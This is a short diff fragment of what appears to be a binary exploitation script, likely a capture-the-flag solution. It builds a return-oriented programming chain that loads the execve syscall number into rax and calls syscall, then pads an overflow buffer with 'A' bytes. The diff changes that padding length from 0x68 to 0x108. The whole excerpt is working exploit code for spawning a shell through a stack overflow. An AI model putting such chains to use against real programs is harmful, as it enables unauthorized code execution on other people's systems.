@@ -37,7 +37,7 @@ rop += rebase_0(0x00000000000158f4) # 0x00000000004158f4: pop rax; ret;
 rop += p64(0x000000000000003b)
 rop += rebase_0(0x0000000000074e35) # 0x0000000000474e35: syscall; ret;
 
-payload  = 0x68 * b'A'
+payload  = 0x108 * b'A'
 payload += rop
 
 p.sendline()
